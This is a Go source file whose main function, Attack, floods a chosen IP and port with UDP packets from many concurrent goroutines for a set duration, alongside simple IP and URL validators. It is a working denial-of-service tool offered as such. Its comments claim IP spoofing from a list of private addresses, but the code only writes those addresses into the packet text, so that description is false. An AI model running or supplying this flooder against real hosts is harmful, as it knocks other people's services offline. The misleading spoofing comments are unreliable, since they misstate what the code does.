package services

import (
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"regexp"
	"sync"
	"time"
)

// isValidIP validates if the input is a valid IPv4 address
func isValidIP(ip string) bool {
	// Regular expression for validating IPv4 format
	ipRegex := `^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$`
	re := regexp.MustCompile(ipRegex)
	return re.MatchString(ip)
}

// isValidURL validates if the input is a valid URL
func isValidURL(u string) bool {
	_, err := url.ParseRequestURI(u)
	return err == nil
}

// GetIp validates if the input is a valid IP or URL
func GetIp(ip string, port int) string {
	// Validate IP or URL format
	if isValidIP(ip) {
		return fmt.Sprintf("Valid IP address: %s", ip)
	} else if isValidURL(ip) {
		return fmt.Sprintf("Valid URL: %s", ip)
	} else {
		return "Invalid IP or URL format!"
	}
}

// List of fake IPs for spoofing
var fakeIps = []string{
	"192.168.1.100",
	"192.168.1.101",
	"192.168.1.102",
	"10.0.0.1",
	"10.0.0.2",
	"172.16.0.1",
	"172.16.0.2",
}

// Attack simulates a DDoS attack by flooding a target IP with UDP packets
func Attack(ip string, port int, duration int, threads int) {
	var wg sync.WaitGroup
	durationInMillis := time.Duration(duration) * time.Second

	// Function to generate random fake IP from the fakeIps array
	randomFakeIp := func() string {
		return fakeIps[rand.Intn(len(fakeIps))]
	}

	// Function to simulate sending a UDP packet
	sendPacket := func() {
		// Create a UDP connection (no actual connection in UDP)
		conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
		if err != nil {
			fmt.Println("Error connecting:", err)
			return
		}
		defer conn.Close()

		// Use a random fake IP
		fakeIP := randomFakeIp()

		// Start sending UDP packets for the duration
		startTime := time.Now()
		for time.Since(startTime) < durationInMillis {
			// Send a simple fake UDP packet
			_, err := conn.Write([]byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\n", fakeIP)))
			if err != nil {
				fmt.Println("Error sending packet:", err)
				return
			}

			// Log every packet sent (for demo purposes)
			fmt.Println("Sent packet using Fake IP:", fakeIP)
		}
	}

	// Start goroutines for each thread
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendPacket()
		}()
	}

	// Wait for all threads to finish
	wg.Wait()

	// After all threads finish, print attack completion
	fmt.Println("Attack completed!")
}
